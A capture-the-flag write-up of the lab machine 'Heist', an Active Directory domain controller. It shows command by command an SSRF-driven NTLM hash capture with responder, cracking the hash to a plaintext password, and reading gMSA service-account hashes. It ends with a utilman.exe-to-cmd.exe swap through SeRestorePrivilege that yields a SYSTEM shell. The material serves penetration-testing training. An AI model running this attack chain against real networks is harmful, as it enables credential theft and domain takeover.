# Heist

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 -Pn 192.168.240.165
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-07 13:09 +08
Nmap scan report for 192.168.240.165
Host is up (0.17s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
8080/tcp  open  http-proxy
9389/tcp  open  adws
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49674/tcp open  unknown
49687/tcp open  unknown
49740/tcp open  unknown
```

This is an AD machine. There were no null credentials accepted by any service. Also, RDP is open.

### Secure Web Browser -> NTLM Capture

Port 8080 hosted a Secure Web Browser application:

<figure><img src="../../../.gitbook/assets/image (3366).png" alt=""><figcaption></figcaption></figure>

This looks vulnerable to SSRF, and it is.&#x20;

<figure><img src="../../../.gitbook/assets/image (500).png" alt=""><figcaption></figcaption></figure>

We can view the exact request this is sending:

```
$ nc -lvnp 80                                 
listening on [any] 80 ...
connect to [192.168.45.216] from (UNKNOWN) [192.168.240.165] 49902
GET /hiiamssrf HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)
Host: 192.168.45.216
```

This might be poisanable with `responder`, and I tested it:

<figure><img src="../../../.gitbook/assets/image (3237).png" alt=""><figcaption></figcaption></figure>

This hash can be cracked instantly:

```
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
california       (enox)     
1g 0:00:00:00 DONE (2023-07-07 13:20) 100.0g/s 204800p/s 204800c/s 204800C/s 123456..lovers1
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

We can then `evil-winrm` into the box:

<figure><img src="../../../.gitbook/assets/image (2482).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Bloodhound -> ReadGMSAPassword

Remember to add this entry to the `/etc/hosts` file:

```
192.168.240.165 heist.offsec dc01.heist.offsec
```

Afterwards, we can run `bloodhound-python` on this domain:

```
$ bloodhound-python -d heist.offsec -u enox -p california -c all -ns 192.168.240.165
```

After the data is uploaded, we can see that `enox` is part of the Web Admins group:

<figure><img src="../../../.gitbook/assets/image (3239).png" alt=""><figcaption></figcaption></figure>

This group has the ReadGMSAPassword privilege over the DC:

<figure><img src="../../../.gitbook/assets/image (3227).png" alt=""><figcaption></figcaption></figure>

There is one service account present on the domain, and it is `svc_apache`:

```
*Evil-WinRM* PS C:\Users\enox\desktop> dir C:\Users


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/20/2021   4:25 AM                Administrator
d-----        2/17/2023   2:28 PM                enox
d-r---        5/28/2021   3:53 AM                Public
d-----        9/14/2021   8:27 AM                svc_apache$
```

To abuse this, we can use `GMSAPasswordReader.exe` to read the password.&#x20;

```
*Evil-WinRM* PS C:\Users\enox\desktop> .\gmsapasswordreader.exe --AccountName 'svc_apache$'
Calculating hashes for Old Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : F3BD314F41B2238B77AE44295B1692D0
[*]       aes128_cts_hmac_sha1 : C3E579495A9E7D2E628AF3706F4D3F8E
[*]       aes256_cts_hmac_sha1 : 9CE142EE695F99644C7E353BD41003A1DE557D49E964CE303580DE61839FB100
[*]       des_cbc_md5          : 29EC62D95B83C80E

Calculating hashes for Current Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : F545CFD20E81CB5F45ECBFC138298D74
[*]       aes128_cts_hmac_sha1 : 71BA26A3A3F8943448F3A30601D60CF2
[*]       aes256_cts_hmac_sha1 : E7729B725E69655399D18745127797D22D14E70ED8D6F40ED8CD2E89B71C361C
[*]       des_cbc_md5          : 0104797391E6C86D
```

We can then `evil-winrm` in as this user:

<figure><img src="../../../.gitbook/assets/image (3017).png" alt=""><figcaption></figcaption></figure>

### SeRestorePrivilege -> RDP Shell

This service user has the SeRestorePrivilege enabled:

```
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

To exploit this, we can follow the methodology on PayloadAllTheThings:

<figure><img src="../../../.gitbook/assets/image (2533).png" alt=""><figcaption></figcaption></figure>

We can execute these commands:

```
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> Enable-SeRestorePrivilege
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> cd C:\Windows\System32
*Evil-WinRM* PS C:\Windows\System32> move utilman.exe utilman.old
*Evil-WinRM* PS C:\Windows\System32> move cmd.exe utilman.exe
```

Afterwards we need RDP access. We don't actually need to login, we just need to access the login page:

```
$ rdesktop -d heist.offsec -u enox -p california heist.offsec
```

![](<../../../.gitbook/assets/image (3565).png>)

Just press the button on the bottom right, and it will spawn a SYSTEM shell:

<figure><img src="../../../.gitbook/assets/image (2099).png" alt=""><figcaption></figcaption></figure>

If you want to get a proper shell, then we can just add `enox` to the Domain Admins and Administrators groups with `net.exe`. Rooted!&#x20;
